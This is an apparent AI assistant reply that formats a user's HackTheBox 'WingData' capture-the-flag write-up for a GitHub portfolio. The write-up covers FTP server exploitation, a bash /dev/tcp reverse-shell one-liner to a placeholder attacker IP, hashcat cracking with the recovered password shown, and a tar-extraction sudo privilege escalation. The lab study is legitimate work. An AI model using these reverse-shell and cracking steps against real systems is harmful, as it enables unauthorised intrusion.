Good—this is exactly the kind of raw material that turns into a strong GitHub project if it’s cleaned up and structured properly.

I’ve taken what you wrote and turned it into a **professional, recruiter-ready Markdown write-up**. This isn’t just formatting—I tightened the narrative so it reads like someone who understands what they’re doing, not just following steps.

---

# 📄 GitHub-Ready Markdown

````markdown
# WingData HTB Write-Up

## Overview
This project documents the full exploitation of the **WingData** machine. The objective was to identify vulnerabilities, gain initial access, escalate privileges, and retrieve both user and root flags.

This lab demonstrates:
- Service enumeration
- Web and FTP analysis
- Exploit development and usage
- Reverse shell handling
- Password cracking
- Privilege escalation via insecure file extraction

---

## Reconnaissance

### Connectivity Check
Initial step was verifying connectivity to the target:
```bash
ping <target-ip>
````

---

### Nmap Scan

Performed a service and default script scan:

```bash
nmap -sC -sV <target-ip> -oN nmap_results.txt
```

#### Results:

* **Port 22** → SSH
* **Port 80** → HTTP

Further enumeration revealed a redirect:

```
http://wingdata.htb/
```

---

## Host Enumeration

Added the domain to `/etc/hosts`:

```bash
<target-ip> wingdata.htb
```

Accessing the site revealed a **Client Portal**, which pointed to:

```
ftp.wingdata.htb
```

Added this as well:

```bash
<target-ip> ftp.wingdata.htb
```

---

## Service Analysis

The FTP portal revealed:

```
Wing FTP Server v7.4.3
```

Researching this version revealed known vulnerabilities and publicly available exploits.

---

## Exploitation (Initial Access)

A public Proof-of-Concept (PoC) exploit was found on GitHub.

### Setup

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Run the exploit and provide a reverse shell payload:

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

### Result

Successfully received a reverse shell connection.

---

## Shell Stabilization

Upgraded the shell using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Post-Exploitation Enumeration

Navigated the filesystem and discovered an XML file containing a password hash for user **wacky**.

Extracted and saved the hash for cracking.

---

## Password Cracking

Used Hashcat with the `rockyou.txt` wordlist:

```bash
hashcat -m 1410 hash.txt rockyou.txt
```

### Result:

Password recovered:

```
!#7Blushing^*Bride5
```

---

## Lateral Movement

Used SSH to log in as **wacky**:

```bash
ssh wacky@<target-ip>
```

Successfully obtained the **user flag**.

---

## Privilege Escalation

### Sudo Privileges

Checked sudo permissions:

```bash
sudo -l
```

Found that user **wacky** can execute:

```
restore_backups_clients.py as root
```

---

### Vulnerability Analysis

The script uses:

```python
tar.extractall(path=staging_dir, filter="data")
```

#### Key Issue:

* Extraction runs as **root**
* No proper validation of archive contents
* Vulnerable to **path traversal / symlink attacks**

---

### Exploitation Strategy

1. Create a malicious `.tar` archive
2. Include payload to write outside intended directory
3. Place archive in backup directory
4. Execute restore script with sudo

---

### Execution

* Created malicious tar file via Python
* Moved it into the backup directory
* Executed the restore script:

```bash
sudo /path/to/restore_backups_clients.py
```

---

### Result

Privilege escalation successful → root access obtained.

Retrieved the **root flag**.

---

## Key Takeaways

### Technical Skills Demonstrated

* Network and service enumeration
* Web application analysis
* Exploit research and execution
* Reverse shell handling and stabilization
* Password cracking with Hashcat
* Linux privilege escalation techniques

---

### Security Insights

* **Outdated software** (Wing FTP Server v7.4.3) can expose critical vulnerabilities
* **Improper file extraction** (tar) is a common privilege escalation vector
* **Password reuse / weak storage** enables lateral movement
* Misconfigured **sudo permissions** are high-risk

---

## Tools Used

* Nmap
* Netcat
* Hashcat
* Python
* SSH

---

## Conclusion

This machine highlights how small misconfigurations—outdated services, exposed hashes, and unsafe scripting practices—can chain together into full system compromise.

The attack path followed a realistic progression:

1. Enumeration
2. Exploitation
3. Credential access
4. Privilege escalation

---

## Author

[Your Name]
Cybersecurity Enthusiast | Offensive Security | Defensive Mindset

```

---

## What you did right (and where to push further)

You did the hard part—actually completing the box. That already puts you ahead of most people.

But here’s the honest push:

- You were **step-focused**, not **analysis-focused**
- A strong write-up explains **why the exploit works**, not just “we ran it”
- Your privilege escalation section is *good*—that’s where your thinking showed

If you want to level this up even more, next step would be:
- Add **actual commands for the malicious tar creation**
- Include **log/detection perspective (Wazuh/Sysmon tie-in)** ← this would *really* separate you

---

If you want, I can:
- Turn this into a **GitHub repo structure (README + images folder)**
- Help you write a **second version that looks like a SOC analyst report**
- Or refine it into something that lines up with **job interviews**

Send the next project when you’re ready.
```
